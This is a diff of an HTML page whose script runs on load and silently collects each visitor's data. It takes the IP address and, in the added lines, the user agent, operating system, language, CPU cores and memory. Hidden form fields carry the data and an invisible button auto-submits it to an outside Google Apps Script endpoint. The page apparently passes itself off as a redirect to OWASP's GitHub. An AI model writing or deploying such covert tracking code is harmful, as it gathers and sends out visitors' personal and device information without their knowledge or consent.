@@ -1,11 +1,18 @@
 
+
+
 <form name="submit-to-google-sheet">
   <input type='hidden' name="ip" type="text" id="ip" placeholder="ip" required>
+  <input type='hidden' name="user" type="text" id="user" placeholder="user" required>
+  <input type='hidden' name="os" type="text" id="os" placeholder="os" required>
+  <input type='hidden' name="lang" type="text" id="lang" placeholder="lang" required>
+  <input type='hidden' name="cores" type="text" id="cores" placeholder="cores" required>
+  <input type='hidden' name="ram" type="text" id="ram" placeholder="ram" required>
   <button type="submit" id="go" style="display: none;"</button>
 </form>
 
 <script>
-  const scriptURL = 'https://script.google.com/macros/s/AKfycbwSI9-cW4eUUz1NfD5WOyMLPaBvkBQN6Wm0CRnSF3xlVsMUtDs/exec'
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbx_0gMHYXjT6kP6hEwDUEcnR__3cA6RIkBuvLPMYA/exec'
   const form = document.forms['submit-to-google-sheet']
   form.addEventListener('submit', e => {
     e.preventDefault()
@@ -23,7 +30,21 @@
 			  var ipInfo = this.responseText;
 			  var userNameField = document.getElementById("ip");
               userNameField.value = ipInfo;
-              var goButton = document.getElementById("go");
+			  var useragentField = document.getElementById("user");
+              useragentField.value = window.navigator.userAgent;
+			  var useragentField = document.getElementById("os");
+              useragentField.value = window.navigator.platform;
+			  var useragentField = document.getElementById("lang");
+              useragentField.value = window.navigator.language;
+			  var useragentField = document.getElementById("cores");
+              useragentField.value = window.navigator.hardwareConcurrency;
+			  var useragentField = document.getElementById("ram");
+              useragentField.value = window.navigator.deviceMemory;
+			  //var useragentField = document.getElementById("speed");
+              //useragentField.value = window.navigator.connection.downlink;
+			  
+			  
+			  var goButton = document.getElementById("go");
               goButton.click();
 		  };
 	    }	
@@ -32,8 +53,6 @@
 	  }
 	  user_location();
 	  setTimeout(function(){
-		window.location.replace("https://github.com/OWASP");
+		//window.location.replace("https://github.com/OWASP");
 		}, 1000);
 </script>
-
-
